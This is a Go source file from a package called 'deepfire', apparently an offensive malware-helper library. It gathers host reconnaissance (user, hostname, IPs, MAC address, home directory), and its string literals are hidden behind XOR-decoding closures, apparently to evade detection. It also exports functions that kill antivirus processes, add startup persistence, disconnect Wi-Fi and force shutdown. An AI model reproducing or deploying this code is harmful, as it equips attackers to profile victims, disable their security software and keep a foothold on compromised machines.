package deepfire

import (
	"errors"
	"fmt"
	"io/fs"
	"log"
	"os"
	"os/user"
	"strings"

	"github.com/matishsiao/goInfo"
	"github.com/mitchellh/go-homedir"
	ps "github.com/mitchellh/go-ps"
)

// Info is used to return basic system information.
// Note that if information can not be resolved in a
// specific field it returns "N/A"
func Info() map[string]string {
	_, mac := Iface()
	var (
		u     string
		ap_ip string
	)

	i, _ := goInfo.GetInfo()

	u, _ = GetUser() //info()
	ap_ip = (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	_ = ap_ip
	hdir, err := homedir.Dir()
	if err != nil {
		log.Fatalf(err.Error())
	}

	inf := map[string]string{
		(func() string {
mask := []byte("\x7d\x79\xfa\x25\x4f\xaf\x5b\xc4")
maskedStr := []byte("\x08\x0a\x9f\x57\x21\xce\x36\xa1")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):  u,
		(func() string {
mask := []byte("\xe4\x6a\x50\x33\x83\xcc\xf5\x49")
maskedStr := []byte("\x8c\x05\x23\x47\xed\xad\x98\x2c")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):  fmt.Sprintf((func() string {
mask := []byte("\x3e\xcf")
maskedStr := []byte("\x1b\xb9")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), i.Hostname),
		(func() string {
mask := []byte("\xac\xaa\x94\x89\x33")
maskedStr := []byte("\xcb\xc5\xcb\xe6\x40")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):     fmt.Sprintf((func() string {
mask := []byte("\xb6\xc4")
maskedStr := []byte("\x93\xb2")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), i.GoOS),
		(func() string {
mask := []byte("\x77\xbf")
maskedStr := []byte("\x18\xcc")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):        fmt.Sprintf((func() string {
mask := []byte("\xaf\xe6")
maskedStr := []byte("\x8a\x90")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), i.OS),
		(func() string {
mask := []byte("\xfa\x07\x07\x5b\x8e\x6b\x8b\xfe")
maskedStr := []byte("\x8a\x6b\x66\x2f\xe8\x04\xf9\x93")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):  fmt.Sprintf((func() string {
mask := []byte("\x1c\xe3")
maskedStr := []byte("\x39\x95")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), i.Platform),
		(func() string {
mask := []byte("\x20\xf3\x17\x54\x3f\x38\x99")
maskedStr := []byte("\x43\x83\x62\x0b\x51\x4d\xf4")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):   fmt.Sprintf((func() string {
mask := []byte("\xd4\xab")
maskedStr := []byte("\xf1\xdd")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), i.CPUs),
		(func() string {
mask := []byte("\x85\xe7\x7d\x47\xe3\x41")
maskedStr := []byte("\xee\x82\x0f\x29\x86\x2d")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):    fmt.Sprintf((func() string {
mask := []byte("\x98\xe9")
maskedStr := []byte("\xbd\x9f")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), i.Kernel),
		(func() string {
mask := []byte("\x5b\xf4\x38\x18")
maskedStr := []byte("\x38\x9b\x4a\x7d")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):      fmt.Sprintf((func() string {
mask := []byte("\xee\x13")
maskedStr := []byte("\xcb\x65")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), i.Core),
		(func() string {
mask := []byte("\x64\x2e\xc3\x5f\x22\x42\x41\xcb")
maskedStr := []byte("\x08\x41\xa0\x3e\x4e\x1d\x28\xbb")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):  GetLocalIp(),
		(func() string {
mask := []byte("\x62\x59\xbe\x37\xca\x49\xf3\xc1\x0a")
maskedStr := []byte("\x05\x35\xd1\x55\xab\x25\xac\xa8\x7a")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()): GetGlobalIp(),
		(func() string {
mask := []byte("\xcc\xd4\xd8\x57\x0c")
maskedStr := []byte("\xad\xa4\x87\x3e\x7c")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):     GetGatewayIP(),
		(func() string {
mask := []byte("\x41\xf3\x9a")
maskedStr := []byte("\x2c\x92\xf9")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):       mac,
		(func() string {
mask := []byte("\xaa\x89\x0f\xe8\x0c\x6d\x7b")
maskedStr := []byte("\xc2\xe6\x62\x8d\x68\x04\x09")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):   hdir,
	}

	return inf
}

// PkillPid kills a process by its PID.
func PkillPid(pid int) error {
	err := KillProcByPID(pid)
	return err
}

// KillProcByPID kills a process given its PID.
func KillProcByPID(pid int) error {
	return killProcByPID(pid)
}

// PkillName kills a process by its name.
func PkillName(name string) error {
	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if strings.Contains(proc_name, name) {
			err := KillProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// PkillAv kills Anti-Virus processes that may run within the machine.
func PkillAv() error {
	return pkillAv()
}

// Processes returns a map of a PID to its respective process name.
func Processes() (map[int]string, error) {
	prs := make(map[int]string)
	processList, err := ps.Processes()
	if err != nil {
		return nil, err
	}

	for x := range processList {
		process := processList[x]
		prs[process.Pid()] = process.Executable()
	}

	return prs, nil
}

// Users returns a list of known users within the machine.
func Users() ([]string, error) {
	return users()
}

// WifiDisconnect is used to disconnect the machine from a wireless network.
func WifiDisconnect() error {
	return wifiDisconnect()
}

// Disks returns a list of storage drives within the machine.
func Disks() ([]string, error) {
	return disks()
}

// TraverseCurrentDir lists all files that exist within the current directory.
func TraverseCurrentDir() ([]string, error) {
	files_in_dir := []string{}
	files, err := os.ReadDir((func() string {
mask := []byte("\x78")
maskedStr := []byte("\x56")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		files_in_dir = append(files_in_dir, f.Name())
	}

	return files_in_dir, nil
}

// TraverseDir lists all files that exist within a given directory.
func TraverseDir(dir string) ([]string, error) {
	files_in_dir := []string{}
	files, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		files_in_dir = append(files_in_dir, f.Name())
	}

	return files_in_dir, nil
}

// FilePermissions checks if a given file has read and write permissions.
func FilePermissions(filename string) (bool, bool) {
	write_permission := true
	read_permission := true

	file, err := os.OpenFile(filename, os.O_WRONLY, 0666)
	if err != nil {
		if os.IsPermission(err) {
			write_permission = false
		}
	}
	file.Close()

	return read_permission, write_permission
}

// Exists checks if a given file is in the system.
func Exists(file string) bool {
	_, err := os.Stat(file)
	if err != nil {
		if errors.Is(err, fs.ErrNotExist) {
			return false
		}
	}
	return true
}

// IsRoot checks if the current user is the administrator of the machine.
func IsRoot() bool {
	return isRoot()
}

// Shutdown forces the machine to shutdown.
func Shutdown() error {
	return shutdown()
}

// AddPersistentCommand creates a task that runs a given command on startup.
func AddPersistentCommand(cmd string) error {
	return addPersistentCommand(cmd)
}

func GetUser() (string, error) {
	current_user, err := user.Current()
	return current_user.Username, err
}
